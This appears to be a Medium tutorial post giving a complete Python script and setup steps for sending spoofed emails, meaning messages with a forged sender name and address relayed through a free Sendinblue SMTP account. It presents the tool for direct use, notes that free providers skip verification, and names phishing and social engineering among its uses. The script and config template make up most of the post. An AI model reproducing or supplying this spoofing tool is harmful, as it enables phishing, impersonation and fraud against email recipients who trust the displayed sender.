## Method of Spoofing Emails using 💯 Free Resources

[

![XIT](https://miro.medium.com/v2/resize:fill:44:44/1*FaCGB7bpr7F58VX97TkkkQ.jpeg)



](https://x-it.medium.com/?source=post_page---byline--a5fe0c6ee631---------------------------------------)

> Follow [XIT](https://x-it.medium.com/) on medium & [UglyCompany](https://t.me/UglyCompany) on Telegram for more..

![](https://miro.medium.com/v2/resize:fit:700/1*cQ9gvBQi718kT4w61CscRA.png)

Proof Of Concept 😂

It’s been a long and a lot of people have been asking for a guide to sending spoofing email, so I thought to write on it today. As you read in the title, the Email Spoofing for Free!? Yes :) the resources I’m using in this process are totally free of cost and nothing will be charged. There are even other email spoofing methods which is more advanced than this, but it includes the paid resources which I can’t afford 😂 as I see no incoming tips from ya’ll. So lets start on todays topic; Have you ever received an email in your box that looked as if it came from a different sender than it actually did? This is called email spoofing, and it can be done for a variety of reasons. In this guide, we’ll explore the basics of email spoofing and show you how to do it using free resources.

## What is Email Spoofing?

Email spoofing includes sending emails with addresses that appear to be from someone else which we don’t have access in real. This is mainly done by changing the header information of the email sender to make it look like it came from a different legit sender. Email spoofing can be used for a variety of reasons, like phishing attacks, spam, and social engineering.

## Why is Email Spoofing Done?

Email spoofing can be done for both malicious and non-malicious purposes. Example: a company might use email spoofing to send emails from a generic email address (“[admin@xitcompany.com](mailto:admin@xitcompany.com)”) instead of an employee’s personal email address. On the other hand, spammers and scammers may use email spoofing to trick recipients into clicking on links or opening attachments that contain malware.

## Requirements for Email Spoofing

Below are the Requirements for Email Spoofing (All the resources are free of cost so no need to invest anything for those)

1.  Spoof Email Sending Script
2.  Free SMTP (I’m using sendinblue.com in this tuto. which can send 300 emails for free. No credit card & No documents required for account verification)

> **What is SMTP?**
> 
> SMTP is the short for Simple Mail Transfer Protocol. It’s the standard protocol used for sending and receiving emails over the internet.

## 1) Spoof Email Sending Script

Using below script you can send the basic text message to the target email address using the spoofed email with the spoof name. Make sure you do the following changes in the script.py file & config.ini file.

![](https://miro.medium.com/v2/resize:fit:502/1*3xB9QpwaYp3MObLMucWQsQ.png)

**changes to make in the script.py**

![](https://miro.medium.com/v2/resize:fit:424/1*zcOQB8qwBQrLxp0aqPEZDQ.png)

**changes to make in the config.ini** (if you are using some other SMTP then make sure you also edit the host & port values)

**script.py** source:

```
<span id="413c" data-selectable-paragraph=""><br><br><span>import</span> smtplib <br><span>from</span> email.mime.text <span>import</span> MIMEText <br><span>from</span> email.mime.multipart <span>import</span> MIMEMultipart<br><span>from</span> email.mime.base <span>import</span> MIMEBase<br><span>from</span> email <span>import</span> encoders <br><span>import</span> traceback<br><span>import</span> configparser<br><br>config = configparser.ConfigParser()<br>config.read(<span>'config.ini'</span>)<br><br><span>def</span> <span>send_mail</span>(<span>receiver_email, spoofed_email, spoofed_name, message, subject</span>):<br>    <span>try</span>:<br>        msg = MIMEMultipart(<span>"related"</span>)<br>        msg[<span>'From'</span>] = <span>f"<span>{spoofed_name}</span> &lt;<span>{spoofed_email}</span>&gt;"</span><br>        msg[<span>'To'</span>] = receiver_email<br>        msg[<span>'Subject'</span>] = subject<br>        body = message<br>        msg.attach(MIMEText(body, <span>'plain'</span>))<br>        <br>        smtp_host = config.get(<span>'SMTP'</span>, <span>'host'</span>)<br>        smtp_port = config.getint(<span>'SMTP'</span>, <span>'port'</span>)<br>        smtp_username = config.get(<span>'SMTP'</span>, <span>'username'</span>)<br>        smtp_password = config.get(<span>'SMTP'</span>, <span>'password'</span>)<br>        <br>        server = smtplib.SMTP(smtp_host, smtp_port)<br>        server.starttls()<br>        server.login(smtp_username, smtp_password)<br>        text = msg.as_string()<br>        server.sendmail(spoofed_email, receiver_email, text)<br>        server.quit()<br>        <span>print</span>(<span>'Spoofed Email sent successfully to '</span>+ <span>str</span>(receiver_email) + <span>' from '</span> + <span>str</span>(spoofed_name))<br>    <span>except</span> Exception <span>as</span> e:<br>        <br>        <span>print</span>(traceback.format_exc())<br><br>receiver_email = <span>'&lt;Receivers Email Address&gt;'</span><br>spoofed_email = <span>'&lt;Spoofed Email Address&gt;'</span><br>spoofed_name = <span>'&lt;Spoofed Name&gt;'</span> <br>message = <span>'&lt;Text Message to send&gt;'</span><br>subject = <span>'&lt;Email Subject/Title&gt;'</span><br><br><br>send_mail(receiver_email,spoofed_email,spoofed_name, message, subject)</span>
```

> The above script creates a multipart MIMEM message with From, To and Subject headers and adds a MIMET body. Next, connect to the SMTP server specified in the configuration file, enable TLS encryption, and log in with the specified username and password. Finally, it sends the email using the sendmail() method of the SMTP server object. To use this script, you would need to modify the following variables:

1.  **receiver\_email**: The email address of the recipient.
2.  **spoofed\_email**: The email address you want to spoof (i.e., the email address that will appear in the From header of the email).
3.  **spoofed\_name**: The name you want to associate with the spoofed email address.
4.  **message**: The text of the email message.
5.  **subject**: The subject line of the email message.

You would also need to create a **config.ini** file with the following SMTP settings:

```
<span id="e470" data-selectable-paragraph=""><span>[SMTP]</span><br><span>host</span> = &lt;SMTP server hostname&gt;<br><span>port</span> = &lt;SMTP server port&gt;<br><span>username</span> = &lt;SMTP server username&gt;<br><span>password</span> = &lt;SMTP server password&gt;</span>
```

## 2) Getting SMTP for Free

There are several SMTP providers who has free plans included, most of them don’t even ask for verification while registration, so you can make use of them. Here, i’ll be using sendinblue.com to get SMTP for free of cost & even they didn’t asked for Credit Card while registration. Below are the step by step guide to get it:

> 🤣 Ignore the inputs & put your real info in it..

## Step-1: Create your account

Visit [https://onboarding.sendinblue.com/account/register](https://onboarding.sendinblue.com/account/register) & signup using your email.

![](https://miro.medium.com/v2/resize:fit:700/1*jBfrk2n0zC002xeq1S0uTw.png)

## Step-2: Verify Your Email

Check your inbox for an email from Sendinblue and click on the verification link.

![](https://miro.medium.com/v2/resize:fit:700/1*fSmrWas9O8Oug29l3XdJYg.png)

## Step-3: Set Up Your Account

Fill the basic info to set up your account.

## Step-4: Get Your SMTP Information

Click on the “SMTP & API” tab in your project dashboard to access your SMTP information.

## Step-5: Configure Your Email Script

Use the SMTP information provided by Sendinblue to configure your email sending **script.py** & config.ini file.

Once you are done with these all steps then you are good to use the script for sending spoof emails. If you encounter any errors or issues then kindly drop a comment below. Also if you like the content and want more, then drop a [tip](https://www.buymeacoffee.com/x.it). & make sure you Follow so you will be notified once we upload some cool stuff like such.

That’s all for today, lets meet in the next topic. Stay secure, Stay Safe.

[

![](https://miro.medium.com/v2/resize:fit:700/1*gS6Sh6i8g535gOafY4Wl1w.png)

](https://www.buymeacoffee.com/x.it)

A supporter is worth a thousand followers. 😊